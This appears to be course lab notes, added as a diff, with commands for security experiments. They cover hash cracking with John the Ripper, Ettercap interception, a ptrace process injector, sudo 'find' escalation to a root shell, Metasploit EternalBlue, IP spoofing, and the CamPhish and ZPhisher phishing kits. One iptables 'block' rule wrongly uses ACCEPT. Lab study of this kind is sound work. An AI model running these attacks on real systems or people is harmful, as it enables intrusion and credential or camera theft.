@@ -1,0 +1,263 @@
+Experiment - 2
+
+Command to Decode Base64 String
+echo "ENTER-BASE64-STRING" | base64 -d
+	(or)
+base64 -d encoded.txt
+
+Command to Encode Plain text to Hexadecimal
+echo "PLAIN-TEXT" | xxd -p
+
+Command to Decode Hexadecimal to Plain text
+echo "ENTER HEXA-DECIMAL-STRING" | xxd -r -p
+
+Command to generate hashes
+echo -n "hello" | md5sum
+echo -n "hello" | sha1sum
+echo -n "hello" | sha256sum
+
+To compute and store value directly in file
+echo -n "hello" | md5sum > md.txt
+
+
+
+
+Experiment - 3
+
+Command to check IP Address
+ifconfig
+
+Command to Open Ettercap in GUI Mode
+ettercap -G
+
+IP Address (10.2.2.1 or 10.2.2.2) - Gateway
+
+Use selected network adapter for the Attack simulation to capture Packets in Wireshark.
+
+
+
+
+Experiment - 4
+
+Install John The Ripper
+sudo apt install john
+
+Ensure it's installed
+john
+
+Create Hash for a password using online Hashing tools
+Store it in hash.txt
+
+Run John the Ripper
+john hash.txt
+
+To display cracked passwords
+john --show hash.txt
+
+
+
+
+Experiment - 5
+
+Check iptables Version
+iptables --version
+
+View Existing Firewall Rules
+sudo iptables -L
+
+Set Policy (To block incoming traffic)
+sudo iptables -P INPUT DROP
+
+Set Policy (To allow outgoing traffic)
+sudo iptables -P OUTPUT ACCEPT
+
+Add Policy (To allow localhost traffic)
+sudo iptables -A INPUT -i lo -j ACCEPT
+
+Add Policy (To allow SSH connections) Port No = 22
+sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+
+Add Policy (To allow HTTP traffic) Port No = 80
+sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+
+ADD Policy (To allow HTTPS traffic) Port No = 443
+sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT
+
+ADD Policy (Block traffic from custom IP)
+sudo iptables -A INPUT -s 192.168.1.100 -j ACCEPT
+
+Save IPTables rules
+sudo iptables-save > firewall.txt
+
+
+
+
+Experiment - 7
+
+Create target program
+nano target.c
+
+#include <stdio.h>
+int main() {
+while(1) {
+printf("This is an infinite loop...\n"); }
+return 0; }
+
+Compile target program
+gcc target.c -o target
+
+Execute target program
+./target
+
+Note Process ID (PID) using:
+ps aux | grep target
+
+Create injector program
+nano injector.c
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <sys/user.h>
+#include <unistd.h>
+int main(int argc, char *argv[]) { if (argc != 2) {
+printf("Usage: %s <pid>\n", argv[0]);
+return 1;
+}
+pid_t pid = atoi(argv[1]);
+struct user_regs_struct regs;
+if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) { perror("ptrace attach failed");
+return 1;
+}
+waitpid(pid, NULL, 0);
+printf("Attached to process %d\n", pid); if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
+perror("getregs failed");
+return 1;
+}
+printf("Original RIP: %llx\n", regs.rip);
+regs.rip += 2;
+if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) { perror("setregs failed");
+return 1;
+}
+printf("Modified RIP: %llx\n", regs.rip); ptrace(PTRACE_DETACH, pid, NULL, NULL); printf("Detached from process\n"); return 0;
+}
+
+Compile injector program
+gcc injector.c -o injector
+
+sudo ./injector <PID> #Use PID of target
+
+
+
+
+Experiment - 8
+
+Run whoami before escalation and submit current user
+whoami
+
+
+Run sudo -l and display permissions
+sudo -l
+
+
+Escalate privileges and display whoami
+sudo find . -exec /bin/sh \; -quit
+whoami
+
+
+Find SUID Binary
+find / -type f -perm -04000 -ls 2>/dev/null
+
+
+Perform Privilege Escalation and verify root access
+
+Current User
+whoami
+
+Enumerate Sudo Permissions
+sudo -l
+
+Find SUID Binaries
+find / -type f -perm -4000 -ls 2>/dev/null
+
+Expolit Sudo Misconfiguration
+sudo find . -exec /bin/sh \; -quit
+whoami
+
+
+
+
+Experiment - 9
+
+Start Metasploit
+msfconsole
+
+Search Exploit
+search smb
+
+Select Exploit from smb
+use exploit/windows/smb/ms17_010_eternalblue
+
+Set Target IP (Specify victim machine IP)
+set RHOSTS <target-ip>
+
+Set Local Host (Specify Attacker machine IP)
+set LHOST <your-ip>
+
+Verify vulnerability
+check
+
+Run exploit
+exploit
+
+
+
+
+Experiment - 11
+
+Update system package
+sudo apt update
+
+Clone IP Spoofing Tool
+git clone https://github.com/<username>/<ip-spoofing-tool>
+
+Install dependencies
+sudo apt install python3
+pip install -r requirements.txt
+
+Configure tool
+nano spoof.py
+
+Execute IP Spoofing
+sudo python3 spoof.py
+
+
+
+
+Experiment - 12
+
+Clone Camera Phishing Tool
+git clone https://github.com/techchipnet/CamPhish.git
+
+Go to project root folder
+cd CamPhish
+
+Execute script
+chmod +x camphish.sh
+./camphish.sh
+
+
+
+
+Experiment - 13
+
+Clone ZPhisher Tool
+git clone https://github.com/htr-tech/zphisher.git
+
+Go to project root folder
+cd zphisher
+
+Execute script
+bash zphisher.sh
